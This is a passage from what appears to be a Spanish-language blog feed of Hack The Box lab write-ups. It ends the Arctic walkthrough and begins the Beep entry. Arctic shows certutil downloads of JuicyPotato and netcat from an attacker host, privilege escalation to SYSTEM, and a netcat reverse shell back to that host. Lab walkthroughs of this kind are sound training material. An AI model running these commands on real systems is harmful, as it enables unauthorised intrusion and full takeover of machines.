+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.11 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;07/Sep/2021 23:11:13] &lt;span class=&quot;s2&quot;&gt;&quot;GET /JuicyPotato.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
+10.10.10.11 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;07/Sep/2021 23:11:14] &lt;span class=&quot;s2&quot;&gt;&quot;GET /JuicyPotato.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
+10.10.10.11 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;07/Sep/2021 23:20:03] &lt;span class=&quot;s2&quot;&gt;&quot;GET /nc.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
+10.10.10.11 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;07/Sep/2021 23:20:03] &lt;span class=&quot;s2&quot;&gt;&quot;GET /nc.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc
+
+certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.13/JuicyPotato.exe JP.exe
+certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.13/JuicyPotato.exe JP.exe
+&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
+  000000  ...
+  054e00
+CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
+
+certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.13/nc.exe nc.exe
+&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
+  0000  ...
+  6e00
+CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora nos ponemos en escucha a través del puerto 443 y ejecutamos el &lt;em&gt;Juicy Potato&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;JP.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rivesc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd.exe 10.10.14.13 443&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 4444
+JP.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rivesc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd.exe 10.10.14.13 443&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 4444
+Testing &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 4444
+....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] authresult 0
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] CreateProcessWithTokenW OK
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.13] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.11] 49752
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7600]
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos administradores del sistema y podemos visualizar la flag &lt;em&gt;root.txt&lt;/em&gt;.&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Arbitrary_File_Upload" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Arctic en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Beep</title><link href="http://localhost:4000/htb-beep/" rel="alternate" type="text/html" title="Hack The Box Beep" /><published>2021-09-07T00:00:00-05:00</published><updated>2021-09-07T00:00:00-05:00</updated><id>http://localhost:4000/htb-beep</id><content type="html" xml:base="http://localhost:4000/htb-beep/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-beep/banner-beep.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;beep&quot;&gt;Beep&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.7.&lt;/p&gt;
